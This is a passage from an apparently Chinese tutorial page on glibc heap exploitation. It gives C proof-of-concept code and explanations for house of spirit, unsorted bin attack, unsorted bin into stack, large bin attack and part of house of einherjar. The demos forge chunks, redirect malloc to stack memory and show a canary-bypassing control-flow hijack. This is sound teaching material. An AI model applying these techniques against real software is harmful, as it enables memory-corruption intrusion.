class="hljs-built_in">memset</span>(b2,<span class="hljs-string">&#x27;B&#x27;</span>,<span class="hljs-number">0x80</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在 b2 填充的内容是:\n%s\n&quot;</span>,b2);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在对 b1 和 c 进行 free 因为 c 的 prev_size 是 0x210，所以会把他俩给合并，但是这时候里面还包含 b2 呐.\n&quot;</span>);<br><br>    <span class="hljs-built_in">free</span>(b1);<br>    <span class="hljs-built_in">free</span>(c);<br>    <br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;这时候我们申请一个 0x300 大小的 chunk 就可以覆盖着 b2 了\n&quot;</span>);<br>    d = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x300</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;d 申请到了: %p，我们填充一下 d 为 \&quot;D\&quot;\n&quot;</span>,d);<br>    <span class="hljs-built_in">memset</span>(d,<span class="hljs-string">&#x27;D&#x27;</span>,<span class="hljs-number">0x300</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在 b2 的内容就是:\n%s\n&quot;</span>,b2);<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>对p2进行切割，但是p2的presize填在了p3-0x10的位置，在free p2后，对它切割两次，此时再free p2和p3就会出现二者合并，但是中间有正在使用的由p2切割出来的一个块。这时再申请一个p2+p3大小的块就能够控制那个切割出来的块了。</p><h3 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house_of_spirit"></a>house_of_spirit</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;这个例子演示了 house of spirit 攻击\n&quot;</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;我们将构造一个 fake chunk 然后释放掉它，这样再次申请的时候就会申请到它\n&quot;</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;覆盖一个指向 fastbin 的指针\n&quot;</span>);<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> *a, *b;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> fake_chunks[<span class="hljs-number">10</span>] __attribute__ ((aligned (<span class="hljs-number">16</span>)));<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;这块区域 (长度为: %lu) 包含两个 chunk. 第一个在 %p 第二个在 %p.\n&quot;</span>, <span class="hljs-keyword">sizeof</span>(fake_chunks), &amp;fake_chunks[<span class="hljs-number">1</span>], &amp;fake_chunks[<span class="hljs-number">9</span>]);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;构造 fake chunk 的 size，要比 chunk 大 0x10（因为 chunk 头），同时还要保证属于 fastbin，对于 fastbin 来说 prev_inuse 不会改变，但是其他两个位需要注意都要位 0\n&quot;</span>);<br>    fake_chunks[<span class="hljs-number">1</span>] = <span class="hljs-number">0x40</span>; <span class="hljs-comment">// size</span><br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;next chunk 的大小也要注意，要大于 0x10 小于 av-&gt;system_mem（128kb）\n&quot;</span>);<br>        <span class="hljs-comment">// 这是fake_chunks[?]可以数一下</span><br>    fake_chunks[<span class="hljs-number">9</span>] = <span class="hljs-number">0x1234</span>; <span class="hljs-comment">// nextsize</span><br>    fake_chunks[<span class="hljs-number">2</span>] = <span class="hljs-number">0x4141414141414141L</span>L;<br>    fake_chunks[<span class="hljs-number">10</span>] = <span class="hljs-number">0x4141414141414141L</span>L;<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在，我们拿伪造的那个 fake chunk 的地址进行 free, %p.\n&quot;</span>, &amp;fake_chunks[<span class="hljs-number">2</span>]);<br>    a = &amp;fake_chunks[<span class="hljs-number">2</span>];<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;free!\n&quot;</span>);<br>    <span class="hljs-built_in">free</span>(a);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在 malloc 的时候将会把 %p 给返回回来\n&quot;</span>, &amp;fake_chunks[<span class="hljs-number">2</span>]);<br>    b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x30</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;malloc(0x30): %p\n&quot;</span>, b);<br>    b[<span class="hljs-number">0</span>] = <span class="hljs-number">0x4242424242424242L</span>L;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;ok!\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>在栈上伪造了两个堆块，第一个是要被free的，第二个是0x1234骗过free，然后直接free第一个指针就会把那一块地址放入fastbins，在申请回来就能用fakechunk[2]去修改fakechunk[1]</p><h3 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted_bin_attack"></a>unsorted_bin_attack</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;unsorted bin attack 实现了把一个超级大的数（unsorted bin 的地址）写到一个地方\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;实际上这种攻击方法常常用来修改 global_max_fast 来为进一步的 fastbin attack 做准备\n\n&quot;</span>);<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var=<span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;我们准备把这个地方 %p 的值 %ld 更改为一个很大的数\n\n&quot;</span>, &amp;stack_var, stack_var);<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x410</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;一开始先申请一个比较正常的 chunk: %p\n&quot;</span>,p);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;再分配一个避免与 top chunk 合并\n\n&quot;</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">500</span>);<br><br>    <span class="hljs-built_in">free</span>(p);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;当我们释放掉第一个 chunk 之后他会被放到 unsorted bin 中，同时它的 bk 指针为 %p\n&quot;</span>,(<span class="hljs-type">void</span>*)p[<span class="hljs-number">1</span>]);<br><br>    p[<span class="hljs-number">1</span>]=(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(&amp;stack_var<span class="hljs-number">-2</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在假设有个漏洞，可以让我们修改 free 了的 chunk 的 bk 指针\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;我们把目标地址（想要改为超大值的那个地方）减去 0x10 写到 bk 指针:%p\n\n&quot;</span>,(<span class="hljs-type">void</span>*)p[<span class="hljs-number">1</span>]);<br><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x410</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;再去 malloc 的时候可以发现那里的值已经改变为 unsorted bin 的地址\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;%p: %p\n&quot;</span>, &amp;stack_var, (<span class="hljs-type">void</span>*)stack_var);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>就是把第一个堆块的bk修改成要 修改的地址-0x10，此时这个地址进入了unsortedbins，这样当再一次malloc(0x410)的时候unsortedbins就会认为在这个要修改的地址还有一个空闲的chunk，而unsortedbins只剩它一个了，所以就会把它的fd和bk地址全部修改成main_arean+88。如果再次申请一个chunk，就会把这个chunk申请到要修改的地址。</p><h3 id="unsorted-bin-into-stack"><a href="#unsorted-bin-into-stack" class="headerlink" title="unsorted_bin_into_stack"></a>unsorted_bin_into_stack</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">jackpot</span><span class="hljs-params">()</span>&#123; <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Nice jump d00d\n&quot;</span>); <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>); &#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>  <span class="hljs-type">intptr_t</span> stack_buffer[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;先申请 victim chunk\n&quot;</span>);<br>  <span class="hljs-type">intptr_t</span>* victim = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;再申请一块防止与 top chunk 合并\n&quot;</span>);<br>  <span class="hljs-type">intptr_t</span>* p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;把 %p 这块给释放掉, 会被放进 unsorted bin 中\n&quot;</span>, victim);<br>  <span class="hljs-built_in">free</span>(victim);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;在栈上伪造一个 chunk&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;设置 size 与指向可写地址的 bk 指针&quot;</span>);<br>  stack_buffer[<span class="hljs-number">1</span>] = <span class="hljs-number">0x100</span> + <span class="hljs-number">0x10</span>;<br>  stack_buffer[<span class="hljs-number">3</span>] = (<span class="hljs-type">intptr_t</span>)stack_buffer;<br><br>  <span class="hljs-comment">//------------VULNERABILITY-----------</span><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;假设有一个漏洞可以覆盖 victim 的 size 和 bk 指针\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;大小应与下一个请求大小不同，以返回 fake chunk 而不是这个，并且需要通过检查（2*SIZE_SZ 到 av-&gt;system_mem）\n&quot;</span>);<br>  victim[<span class="hljs-number">-1</span>] = <span class="hljs-number">32</span>;<br>  victim[<span class="hljs-number">1</span>] = (<span class="hljs-type">intptr_t</span>)stack_buffer; <span class="hljs-comment">// victim-&gt;bk is pointing to stack</span><br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在 malloc 的时候将会返回构造的那个 fake chunk 那里: %p\n&quot;</span>, &amp;stack_buffer[<span class="hljs-number">2</span>]);<br>  <span class="hljs-type">char</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;malloc(0x100): %p\n&quot;</span>, p2);<br><br>  <span class="hljs-type">intptr_t</span> sc = (<span class="hljs-type">intptr_t</span>)jackpot; <span class="hljs-comment">// Emulating our in-memory shellcode</span><br>  <span class="hljs-built_in">memcpy</span>((p2+<span class="hljs-number">40</span>), &amp;sc, <span class="hljs-number">8</span>); <span class="hljs-comment">// This bypasses stack-smash detection since it jumps over the canary</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p>先申请来两个0x100大小的chunk，free第一个后第一个会被放入unsortedbins。接着在栈或者其他可写地址写入一个fakechunk(size位为0x100+0x10，bk修改为fakechunk的presize位)，随后把第一个chunk的size位利用漏洞改小，并把bk改为fakechunk的presize位指针。此时再一次申请一个0x100大小的堆块，就会把fakechunk申请出来。</p><h3 id="large-bins-attack"><a href="#large-bins-attack" class="headerlink" title="large_bins_attack"></a>large_bins_attack</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br> <br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;根据原文描述跟 unsorted bin attack 实现的功能差不多，都是把一个地址的值改为一个很大的数\n\n&quot;</span>);<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var1 = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var2 = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;先来看一下目标:\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_var1 (%p): %ld\n&quot;</span>, &amp;stack_var1, stack_var1);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_var2 (%p): %ld\n\n&quot;</span>, &amp;stack_var2, stack_var2);<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x320</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;分配第一个 large chunk: %p\n&quot;</span>, p1 - <span class="hljs-number">2</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;再分配一个 fastbin 大小的 chunk，来避免 free 的时候下一个 large chunk 与第一个合并了\n\n&quot;</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;申请第二个 large chunk 在: %p\n&quot;</span>, p2 - <span class="hljs-number">2</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;同样在分配一个 fastbin 大小的 chunk 防止合并掉\n\n&quot;</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;最后申请第三个 large chunk 在: %p\n&quot;</span>, p3 - <span class="hljs-number">2</span>);<br> <br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;申请一个 fastbin 大小的防止 free 的时候第三个 large chunk 与 top chunk 合并\n\n&quot;</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br> <br>    <span class="hljs-built_in">free</span>(p1);<br>    <span class="hljs-built_in">free</span>(p2);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;free 掉第一个和第二个 chunk，他们会被放在 unsorted bin 中&quot;</span><br>           <span class="hljs-string">&quot; [ %p &lt;--&gt; %p ]\n\n&quot;</span>, (<span class="hljs-type">void</span> *)(p2 - <span class="hljs-number">2</span>), (<span class="hljs-type">void</span> *)(p2[<span class="hljs-number">0</span>]));<br><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在去申请一个比他俩小的，然后会把第一个分割出来，第二个则被整理到 largebin 中，第一个剩下的会放回到 unsortedbin 中&quot;</span><br>            <span class="hljs-string">&quot; [ %p ]\n\n&quot;</span>, (<span class="hljs-type">void</span> *)((<span class="hljs-type">char</span> *)p1 + <span class="hljs-number">0x90</span>));<br><br>    <span class="hljs-built_in">free</span>(p3);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;free 掉第三个，他会被放到 unsorted bin 中:&quot;</span><br>           <span class="hljs-string">&quot; [ %p &lt;--&gt; %p ]\n\n&quot;</span>, (<span class="hljs-type">void</span> *)(p3 - <span class="hljs-number">2</span>), (<span class="hljs-type">void</span> *)(p3[<span class="hljs-number">0</span>]));<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;假设有个漏洞，可以覆盖掉第二个 chunk 的 \&quot;size\&quot; 以及 \&quot;bk\&quot;、\&quot;bk_nextsize\&quot; 指针\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;减少释放的第二个 chunk 的大小强制 malloc 把将要释放的第三个 large chunk 插入到 largebin 列表的头部（largebin 会按照大小排序）。覆盖掉栈变量。覆盖 bk 为 stack_var1-0x10，bk_nextsize 为 stack_var2-0x20\n\n&quot;</span>);<br><br>    p2[<span class="hljs-number">-1</span>] = <span class="hljs-number">0x3f1</span>;<br>    p2[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>    p2[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;<br>    p2[<span class="hljs-number">1</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(&amp;stack_var1 - <span class="hljs-number">2</span>);<br>    p2[<span class="hljs-number">3</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(&amp;stack_var2 - <span class="hljs-number">4</span>);<br><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<br> <br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;再次 malloc，会把释放的第三个 chunk 插入到 largebin 中，同时我们的目标已经改写了:\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_var1 (%p): %p\n&quot;</span>, &amp;stack_var1, (<span class="hljs-type">void</span> *)stack_var1);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_var2 (%p): %p\n&quot;</span>, &amp;stack_var2, (<span class="hljs-type">void</span> *)stack_var2);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>原理与unsortedbins_attack类似，但是能一下子覆盖掉2个区域。</p><h3 id="house-of-einherjar"><a href="#house-of-einherjar" class="headerlink" title="house_of_einherjar"></a>house_of_einherjar</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;malloc.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);<br>    setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-type">uint8_t</span>* a;<br>    <span class="hljs-type">uint8_t</span>* b;<br>    <span class="hljs-type">uint8_t</span>* d;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n申请 0x38 作为 chunk a\n&quot;</span>);<br>    a = (<span class="hljs-type">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x38</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;chunk a 在: %p\n&quot;</span>, a);<br>   <br>    <span class="hljs-type">int</span> real_a_size = malloc_usable_size(a);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;malloc_usable_size()可以返回指针所指向的 chunk 不包含头部的大小，chunk a 的 size: %#x\n&quot;</span>, real_a_size);<br><br>    <span class="hljs-comment">// create a fake chunk</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n接下来在栈上伪造 chunk，并且设置 fd、bk、fd_nextsize、bk_nextsize 来绕过 unlink 的检查\n&quot;</span>);<br><br>    <span class="hljs-type">size_t</span> fake_chunk[<span class="hljs-number">6</span>];<br><br>    fake_chunk[<span class="hljs-number">0</span>] = <span class="hljs-number">0x100</span>; <span class="hljs-comment">// prev_size 必须要等于 fake_chunk 的 size 才能绕过 P-&gt;bk-&gt;size == P-&gt;prev_size</span><br>    fake_chunk[<span class="hljs-number">1</span>] = <span class="hljs-number">0x100</span>; <span class="hljs-comment">// size 只要能够整理到 small bin 中就可以了</span><br>    fake_chunk[<span class="hljs-number">2</span>] = (<span class="hljs-type">size_t</span>) fake_chunk; <span class="hljs-comment">// fd</span><br>    fake_chunk[<span class="hljs-number">3</span>] = (<span class="hljs-type">size_t</span>) fake_chunk; <span class="hljs-comment">// bk</span><br>    fake_chunk[<span class="hljs-number">4</span>] = (<span 